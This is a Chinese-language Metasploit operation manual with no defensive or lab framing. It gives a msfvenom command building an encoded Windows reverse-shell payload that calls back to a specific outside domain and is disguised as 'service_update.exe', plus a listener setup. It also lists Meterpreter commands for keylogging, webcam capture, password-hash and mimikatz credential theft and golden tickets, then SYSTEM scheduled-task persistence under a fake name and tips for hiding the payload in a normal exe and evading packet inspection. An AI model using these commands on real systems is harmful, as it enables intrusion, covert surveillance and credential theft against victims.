# Metasploit Framework 操作手册

## 1. 基础环境与配置

### 1.1 常用全局命令

在 `msfconsole` 环境下：

* `help` / `?`：查看所有可用命令。
* `search [关键字]`：搜索模块（如 `search ms17_010`）。
* `use [模块路径]`：加载特定模块。
* `back`：退出当前模块。
* `set [参数名] [值]`：设置参数。
* `setg [参数名] [值]`：全局设置参数，避免在不同模块间重复输入。
* `options` / `show options`：显示当前模块的配置需求。

### 1.2 数据库交互

* `hosts`：列出数据库中记录的所有主机。
* `services`：查看发现的服务（如 80, 445 端口等）。
* `creds`：列出已抓取的凭据。
* `loot`：查看收割的敏感文件信息。

---

## 2. 载荷生成与混淆 (msfvenom)

在外部 Shell 中执行，用于创建针对目标机的执行文件。

### 2.1 常用 Payload 类型

* **Windows (x64)**: `windows/x64/meterpreter/reverse_tcp`
* **Linux (x64)**: `linux/x64/meterpreter/reverse_tcp`
* **Android**: `android/meterpreter/reverse_tcp`

### 2.2 生成命令示例

针对 Windows 的混淆生成示例：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=sh-aliyun2.vincentzyu233.cn LPORT=60907 \
-e x64/shikata_ga_nai -i 10 \
-f exe-service -o service_update.exe

```

**参数说明：**

* `-p`：指定 Payload。
* `-e`：指定编码器（混淆）。
* `-i`：迭代编码次数（次数越多，静态特征越不明显）。
* `-f`：输出格式（如 `exe`, `exe-service`, `elf`, `hta-psh`, `raw`）。

---

## 3. 监听与利用 (multi/handler)

在 Debian 端接收反弹的 Session。

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 60907
set ExitOnSession false
run -j

```

* `ExitOnSession false`：允许接收多个 Session，而不是捕获一个后就退出监听。

---

## 4. Meterpreter 交互常用操作

一旦 Session 建立，进入交互模式：

### 4.1 权限与进程操作

* `getuid`：查看当前权限。
* `getsystem`：尝试自动提升至 SYSTEM 权限。
* `ps`：列出目标机所有运行进程。
* `migrate [PID]`：将当前 Session 迁移到指定进程。
* **技巧**：迁移至 `explorer.exe` 可获得稳定用户桌面权限，迁移至 `winlogon.exe` 可获得 SYSTEM 权限且保证用户注销后不断连。

* `getpid`：查看当前所在进程 ID。

### 4.2 文件系统操作

* `ls` / `cd` / `pwd`：目录导航。
* `upload [本地路径] [目标路径]`：上传文件。
* `download [目标路径] [本地路径]`：下载文件。
* `search -f *.conf`：在目标机搜索特定后缀的文件。

### 4.3 收集与取证

* **截屏**：`screenshot`
* **桌面实时监控**：`screenshare`
* **摄像头列表**：`webcam_list`
* **抓拍照片**：`webcam_snap`
* **键盘记录**：
```bash
keyscan_start    # 开始记录
keyscan_dump     # 导出内容
keyscan_stop     # 停止记录

```

### 4.4 凭据抓取

* `hashdump`：抓取本地 SAM 数据库的 Hash。
* `load kiwi`：加载 Mimikatz 扩展。
* `creds_all`：抓取明文密码和各种票据。
* `golden_ticket_create`：创建黄金票据。

---

## 5. 持久化与后续利用

### 5.1 计划任务持久化

通过 Shell 执行系统命令：

```cmd
shell
schtasks /create /tn "AppUpdate" /tr "C:\ProgramData\payload.exe" /sc onstart /ru "SYSTEM" /f

```

### 5.2 使用 Post 模块

在 Meterpreter 提示符下：

* `run post/windows/manage/enable_rdp`：一键开启远程桌面。
* `run post/windows/gather/enum_applications`：列出目标安装的所有软件。
* `run post/windows/gather/checkvm`：检查目标是否为虚拟机。

---

## 6. 常见配置微调

### 6.1 解决超时问题

在 `frp` 等高延迟网络环境下，增加超时限制：

```bash
setg CommTimeout 60
setg SessionCommunicationTimeout 60

```

### 6.2 隐藏特征

* **修改加载器**：在使用 `msfvenom` 时，利用 `-x` 参数指定一个正常的 `exe` 文件作为模板，将 Payload 注入到该文件的代码空洞中。
* **修改传输协议**：使用 `reverse_https` 替代 `reverse_tcp`，通过 443 端口加密传输，逃避防火墙深度包检测（DPI）。
